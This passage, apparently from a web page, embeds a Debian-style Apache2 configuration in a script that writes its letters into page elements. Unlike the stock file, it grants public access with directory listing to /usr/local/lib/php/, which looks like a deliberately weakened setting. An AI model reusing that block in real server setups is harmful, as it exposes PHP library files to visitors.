# MaxKeepAliveRequests: The maximum number of requests to allow

# during a persistent connection. Set to 0 to allow an unlimited amount.

# We recommend you leave this number high, for maximum performance.

#

MaxKeepAliveRequests 100

  

#

# KeepAliveTimeout: Number of seconds to wait for the next request from the

# same client on the same connection.

#

KeepAliveTimeout 5

  

  

# These need to be set in /etc/apache2/envvars

User ${APACHE_RUN_USER}

Group ${APACHE_RUN_GROUP}

  

#

# HostnameLookups: Log the names of clients or just their IP addresses

# e.g., www.apache.org (on) or 204.62.129.132 (off).

# The default is off because it'd be overall better for the net if people

# had to knowingly turn this feature on, since enabling it means that

# each client request will result in AT LEAST one lookup request to the

# nameserver.

#

HostnameLookups Off

  

# ErrorLog: The location of the error log file.

# If you do not specify an ErrorLog directive within a <VirtualHost>

# container, error messages relating to that virtual host will be

# logged here. If you *do* define an error logfile for a <VirtualHost>

# container, that host's errors will be logged there and not here.

#

ErrorLog ${APACHE_LOG_DIR}/error.log

  

#

# LogLevel: Control the severity of messages logged to the error_log.

# Available values: trace8, ..., trace1, debug, info, notice, warn,

# error, crit, alert, emerg.

# It is also possible to configure the log level for particular modules, e.g.

# "LogLevel info ssl:warn"

#

LogLevel warn

  

# Include module configuration:

IncludeOptional mods-enabled/*.load

IncludeOptional mods-enabled/*.conf

  

# Include list of ports to listen on

Include ports.conf

  

  

# Sets the default security model of the Apache2 HTTPD server. It does

# not allow access to the root filesystem outside of /usr/share and /var/www.

# The former is used by web applications packaged in Debian,

# the latter may be used for local directories served by the web server. If

# your system is serving content from a sub-directory in /srv you must allow

# access here, or in any related virtual host.

<Directory />

Options FollowSymLinks

AllowOverride None

Require all denied

</Directory>

  

<Directory /usr/share>

AllowOverride None

Require all granted

</Directory>

  

<Directory /var/www/>

Options Indexes FollowSymLinks

AllowOverride None

Require all granted

</Directory>

  

<Directory /usr/local/lib/php/>

Options Indexes FollowSymLinks

AllowOverride None

Require all granted

</Directory>

  

  

  

  

# AccessFileName: The name of the file to look for in each directory

# for additional configuration directives. See also the AllowOverride

# directive.

#

AccessFileName .htaccess

  

#

# The following lines prevent .htaccess and .htpasswd files from being

# viewed by Web clients.

#

<FilesMatch "^\.ht">

Require all denied

</FilesMatch>

  

  

#

# The following directives define some format nicknames for use with

# a CustomLog directive.

#

# These deviate from the Common Log Format definitions in that they use %O

# (the actual bytes sent including headers) instead of %b (the size of the

# requested file), because the latter makes it impossible to detect partial

# requests.

#

# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.

# Use mod_remoteip instead.

#

LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined

LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined

LogFormat "%h %l %u %t \"%r\" %>s %O" common

LogFormat "%{Referer}i -> %U" referer

LogFormat "%{User-agent}i" agent

  

# Include of directories ignores editors' and dpkg's backup files,

# see README.Debian for details.

  

# Include generic snippets of statements

IncludeOptional conf-enabled/*.conf

  

# Include the virtual host configurations:

IncludeOptional sites-enabled/*.conf

  

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

  

if (message) {

let currIdx = 0;

let messageLength = message.length;

  

let parts = document.querySelectorAll('.lazarus-pit > div');

for (let i = 0; i < parts.length; i++) {

let partLength = parts[i].innerHTML.length;

  

parts[i].innerHTML = '';

  

for (let j = 0; j < partLength; j++) {

parts[i].innerHTML += message[currIdx % messageLength];

currIdx++;

}

}

}

</script>

</html>
```